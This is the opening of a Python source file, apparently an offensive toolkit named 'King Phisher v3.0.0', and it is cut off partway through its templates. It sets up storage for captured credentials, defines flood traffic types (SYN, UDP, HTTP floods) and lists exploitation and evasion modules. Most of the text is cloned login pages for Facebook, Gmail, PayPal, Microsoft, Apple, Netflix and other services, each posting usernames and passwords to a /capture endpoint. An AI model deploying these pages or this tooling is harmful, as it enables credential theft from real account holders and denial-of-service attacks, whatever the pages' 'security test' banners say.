#!/usr/bin/env python3
"""
👑 KING PHISHER v3.0.0
Author:Ian Carter Kulani
Features:
        - Multi-Platform Bot Integration (Telegram, Discord, Slack, WhatsApp, iMessage)
    - Web Interface with Cyber Terminal UI (Port 8080)
    - Advanced Phishing Suite with 50+ Templates
    - SSH Remote Access via All Platforms
    - REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)
    - Nikto Web Vulnerability Scanner
    - IP Management & Threat Detection
    - Session Management & Reporting
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import getpass
import socketserver
import itertools
import string
import queue
import tempfile
import traceback
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict, Counter
from functools import wraps
from abc import ABC, abstractmethod

# =====================
# ENCRYPTION
# =====================
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# =====================
# PLATFORM IMPORTS
# =====================

# SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import TimeoutException, NoSuchElementException
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Web Server
try:
    from flask import Flask, request, jsonify, send_file, render_template_string
    from flask_cors import CORS
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sendp, sr1, srp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Colorama
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# =====================
# THEME COLORS (King Phisher Theme - Orange/Purple/Blue)
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        PRIMARY = Fore.MAGENTA + Style.BRIGHT
        SECONDARY = Fore.BLUE + Style.BRIGHT
        ACCENT = Fore.YELLOW + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.CYAN + Style.BRIGHT
        ORANGE = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        PURPLE = Fore.MAGENTA + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        GOLD = Fore.YELLOW + Style.BRIGHT
        RESET = Style.RESET_ALL
        BG_DARK = Back.BLACK + Fore.WHITE
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = ORANGE = PURPLE = BLUE = GOLD = RESET = BG_DARK = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".king_phisher"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
IMESSAGE_CONFIG_FILE = os.path.join(CONFIG_DIR, "imessage_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "king_phisher.db")
LOG_FILE = os.path.join(CONFIG_DIR, "king_phisher.log")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
REPORT_DIR = "reports"
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
SESSIONS_DIR = os.path.join(CONFIG_DIR, "sessions")
WEBHOOKS_DIR = os.path.join(CONFIG_DIR, "webhooks")
PLUGINS_DIR = os.path.join(CONFIG_DIR, "plugins")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR,
    NIKTO_RESULTS_DIR, WHATSAPP_SESSION_DIR, PHISHING_DIR, REPORT_DIR,
    TRAFFIC_LOGS_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, SSH_LOGS_DIR, TIME_HISTORY_DIR, SESSIONS_DIR,
    WEBHOOKS_DIR, PLUGINS_DIR, MODULES_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - KING-PHISHER - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("KingPhisher")

# =====================
# DATA CLASSES
# =====================

class Severity:
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class TrafficType:
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"

class ScanType:
    QUICK = "quick"
    FULL = "full"
    STEALTH = "stealth"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    UDP = "udp"

@dataclass
class Session:
    id: str
    user: str
    platform: str
    created_at: str
    last_active: str
    commands_count: int = 0
    active: bool = True

@dataclass
class SSHServer:
    id: str
    name: str
    host: str
    port: int
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    use_key: bool = False
    timeout: int = 30
    created_at: str = None
    status: str = "disconnected"
    notes: str = ""

@dataclass
class SSHCommandResult:
    success: bool
    output: str
    error: Optional[str] = None
    execution_time: float = 0.0
    server: str = ""

@dataclass
class TrafficGenerator:
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    status: str = "pending"

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class PhishingLink:
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class ManagedIP:
    ip_address: str
    added_by: str
    added_date: str
    notes: str
    is_blocked: bool = False

@dataclass
class Module:
    id: str
    name: str
    description: str
    version: str
    author: str
    enabled: bool = True

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "monitoring": {"enabled": True, "port_scan_threshold": 10},
        "scanning": {"default_ports": "1-1000", "timeout": 30},
        "security": {"auto_block": False, "log_level": "INFO"},
        "nikto": {"enabled": True, "timeout": 300},
        "traffic_generation": {"enabled": True, "max_duration": 300, "allow_floods": False},
        "social_engineering": {"enabled": True, "default_port": 8080, "capture_credentials": True},
        "ssh": {"enabled": True, "default_timeout": 30, "max_connections": 5},
        "discord": {"enabled": False, "token": "", "prefix": "!"},
        "telegram": {"enabled": False, "api_id": "", "api_hash": "", "bot_token": ""},
        "slack": {"enabled": False, "bot_token": "", "channel_id": "", "prefix": "!"},
        "whatsapp": {"enabled": False, "phone_number": "", "prefix": "/"},
        "imessage": {"enabled": False, "phone_numbers": [], "prefix": "!"},
        "web_server": {"enabled": True, "port": 8080, "host": "0.0.0.0"}
    }
    
    @staticmethod
    def load_config() -> Dict:
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    for key, value in ConfigManager.DEFAULT_CONFIG.items():
                        if key not in config:
                            config[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in config[key]:
                                    config[key][sub_key] = sub_value
                    return config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        return ConfigManager.DEFAULT_CONFIG.copy()
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user TEXT NOT NULL,
                platform TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                commands_count INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                platform TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password TEXT,
                key_file TEXT,
                use_key BOOLEAN DEFAULT 0,
                timeout INTEGER DEFAULT 30,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                status TEXT DEFAULT 'disconnected',
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                server_id TEXT NOT NULL,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL,
                executed_by TEXT,
                FOREIGN KEY (server_id) REFERENCES ssh_servers(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                platform TEXT NOT NULL,
                sender TEXT,
                message TEXT,
                response TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS modules (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                description TEXT,
                version TEXT,
                author TEXT,
                enabled BOOLEAN DEFAULT 1,
                installed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS web_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                ip_address TEXT
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self._init_phishing_templates()
        self._init_modules()
    
    def _init_phishing_templates(self):
        templates = {
            "facebook": self._get_facebook_template(),
            "instagram": self._get_instagram_template(),
            "twitter": self._get_twitter_template(),
            "gmail": self._get_gmail_template(),
            "linkedin": self._get_linkedin_template(),
            "github": self._get_github_template(),
            "paypal": self._get_paypal_template(),
            "microsoft": self._get_microsoft_template(),
            "apple": self._get_apple_template(),
            "discord": self._get_discord_template(),
            "telegram": self._get_telegram_template(),
            "whatsapp": self._get_whatsapp_template(),
            "netflix": self._get_netflix_template(),
            "spotify": self._get_spotify_template(),
            "amazon": self._get_amazon_template(),
            "custom": self._get_custom_template()
        }
        
        for name, html in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, name, html))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _init_modules(self):
        modules = [
            ("network_scanner", "Network Scanner", "Advanced network scanning tools", "1.0", "King Phisher Team"),
            ("web_scanner", "Web Scanner", "Web vulnerability scanner", "1.0", "King Phisher Team"),
            ("social_engineering", "Social Engineering", "Phishing and social engineering tools", "1.0", "King Phisher Team"),
            ("traffic_gen", "Traffic Generator", "Network traffic generation", "1.0", "King Phisher Team"),
            ("exploitation", "Exploitation", "Exploitation framework", "1.0", "King Phisher Team"),
            ("post_exploit", "Post Exploitation", "Post exploitation tools", "1.0", "King Phisher Team"),
            ("reporting", "Reporting", "Report generation", "1.0", "King Phisher Team"),
            ("evasion", "Evasion", "Evasion techniques", "1.0", "King Phisher Team")
        ]
        
        for module_id, name, desc, version, author in modules:
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO modules (id, name, description, version, author)
                    VALUES (?, ?, ?, ?, ?)
                ''', (module_id, name, desc, version, author))
            except Exception as e:
                logger.error(f"Failed to insert module {name}: {e}")
        
        self.conn.commit()
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html><head><title>Facebook Login</title>
<style>body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#1877f2;font-size:40px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:6px}
button{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">facebook</div>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html><head><title>Instagram Login</title>
<style>body{font-family:-apple-system;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #dbdbdb;padding:40px;width:350px}
.logo{font-family:cursive;font-size:50px;text-align:center}
input{width:100%;padding:8px;margin:5px 0;border:1px solid #dbdbdb;border-radius:4px}
button{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:4px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">Instagram</div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html><head><title>X / Twitter</title>
<style>body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center;color:#fff}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;color:#fff;border-radius:4px}
button{width:100%;padding:12px;background:#1d9bf0;color:#fff;border:none;border-radius:9999px;cursor:pointer}
.warning{background:#1a1a1a;color:#e7e9ea;text-align:center;padding:12px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">𝕏</div><h2 style="color:#fff">Sign in to X</h2>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:28px;padding:48px;width:450px}
.logo{color:#1a73e8;font-size:24px;text-align:center}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}
button{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer}
.warning{background:#e8f0fe;color:#202124;text-align:center;padding:12px;margin-top:30px}
</style></head>
<body><div class="login-box"><div class="logo">Gmail</div><h2>Sign in</h2>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html><head><title>LinkedIn</title>
<style>body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#0a66c2;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}
button{width:100%;padding:14px;background:#0a66c2;color:#fff;border:none;border-radius:28px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:12px;margin-top:24px}
</style></head>
<body><div class="login-box"><div class="logo">LinkedIn</div><h2>Sign in</h2>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_github_template(self):
        return """<!DOCTYPE html>
<html><head><title>GitHub</title>
<style>body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:32px;width:400px}
.logo{color:#24292f;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px}
button{width:100%;padding:12px;background:#2da44e;color:#fff;border:none;border-radius:6px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">GitHub</div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_paypal_template(self):
        return """<!DOCTYPE html>
<html><head><title>PayPal</title>
<style>body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:4px;padding:40px;width:400px}
.logo{color:#003087;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:4px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">PayPal</div>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_microsoft_template(self):
        return """<!DOCTYPE html>
<html><head><title>Microsoft</title>
<style>body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:4px;padding:48px;width:400px}
.logo{color:#f25022;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:2px}
button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:2px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">Microsoft</div>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_apple_template(self):
        return """<!DOCTYPE html>
<html><head><title>Apple ID</title>
<style>body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:8px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo"></div><h2>Sign in with your Apple ID</h2>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_discord_template(self):
        return """<!DOCTYPE html>
<html><head><title>Discord</title>
<style>body{background:#36393f;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#36393f;border-radius:8px;padding:40px;width:400px}
.logo{color:#fff;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;background:#202225;border:none;border-radius:4px;color:#fff}
button{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:4px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">Discord</div>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_telegram_template(self):
        return """<!DOCTYPE html>
<html><head><title>Telegram Web</title>
<style>body{background:#2aabee;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#2aabee;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#2aabee;color:#fff;border:none;border-radius:8px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">Telegram</div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_whatsapp_template(self):
        return """<!DOCTYPE html>
<html><head><title>WhatsApp Web</title>
<style>body{background:#075e54;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#25d366;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#25d366;color:#fff;border:none;border-radius:8px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">WhatsApp</div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_netflix_template(self):
        return """<!DOCTYPE html>
<html><head><title>Netflix</title>
<style>body{background:#141414;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#000;border-radius:4px;padding:48px;width:400px}
.logo{color:#e50914;font-size:40px;text-align:center}
input{width:100%;padding:16px;margin:10px 0;background:#333;border:none;border-radius:4px;color:#fff}
button{width:100%;padding:16px;background:#e50914;color:#fff;border:none;border-radius:4px;cursor:pointer}
.warning{background:#fff3cd;color:#856404;text-align:center;padding:10px;margin-top:20px}
</style></head>
<body><div class="login-box"><div class="logo">NETFLIX</div>
<form method="POST" action="/capture"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_spotify_template(self):
        return """<!DOCTYPE html>
<html><head><title>Spotify</title>
<style>body{background:#121212;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#000;border-radius:8px;padding:48px;width:400px}
.logo{color:#1ed760;font-size:32px;text-align:center}
